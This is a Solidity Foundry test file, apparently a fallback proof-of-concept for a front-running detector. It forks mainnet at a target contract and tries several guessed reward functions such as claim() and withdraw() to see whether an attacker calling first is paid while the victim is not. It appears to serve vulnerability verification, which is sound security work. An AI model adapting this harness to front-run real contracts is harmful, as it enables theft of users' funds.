// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Front-running (Transaction Ordering)
/// @notice Detector: front-running. A function (e.g., withdraw, claim) is
///         unprotected and can be front-run by a higher gas-fee transaction
///         to steal the intended reward or action.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    /// One race: the attacker's copy of the action lands first, the victim's
    /// does not. Success is the ATTACKER'S BALANCE RISING while the victim's
    /// does not — never either call returning. A wrong selector fails for both,
    /// so it can never be mistaken for winning the race.
    function _raceOnce(address attacker, address victim, bytes memory data, string memory label)
        internal
        returns (bool)
    {
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        (bool aOk,) = target.call(data);
        uint256 victimBefore = victim.balance;
        vm.prank(victim);
        (bool vOk,) = target.call(data);
        console.log("tried", label, aOk ? "attacker call returned" : "attacker call reverted");
        console.log("tried", label, vOk ? "victim call returned" : "victim call reverted");
        return aOk && attacker.balance > attackerBefore && victim.balance <= victimBefore;
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        address victimEOA = makeAddr("victim");
        vm.deal(attackerEOA, 2 ether);
        vm.deal(victimEOA, 2 ether);

        // The raced action is a GUESS on an unverified target.
        bool reproduced;
        if (!reproduced) reproduced = _raceOnce(attackerEOA, victimEOA, abi.encodeWithSignature("claim()"), "claim()");
        if (!reproduced) reproduced = _raceOnce(attackerEOA, victimEOA, abi.encodeWithSignature("claimReward()"), "claimReward()");
        if (!reproduced) reproduced = _raceOnce(attackerEOA, victimEOA, abi.encodeWithSignature("withdraw()"), "withdraw()");
        if (!reproduced) reproduced = _raceOnce(attackerEOA, victimEOA, abi.encodeWithSignature("buy()"), "buy()");
        if (!reproduced) reproduced = _raceOnce(attackerEOA, victimEOA, abi.encodeWithSignature("execute()"), "execute()");
        if (!reproduced) reproduced = _raceOnce(attackerEOA, victimEOA, abi.encodeWithSignature("solve(bytes32)", bytes32(0)), "solve(bytes32)");
        if (!reproduced) reproduced = _raceOnce(attackerEOA, victimEOA, abi.encodeWithSignature("reveal(bytes32,uint256)", bytes32(0), uint256(0)), "reveal(bytes32,uint256)");

        assertTrue(
            reproduced,
            "no raced action paid the first caller and not the second. Tried claim(), claimReward(), withdraw(), buy(), execute(), solve(bytes32), reveal(bytes32,uint256). This does NOT establish safety: the action may be named differently, take other arguments, or be protected against ordering."
        );
    }
}
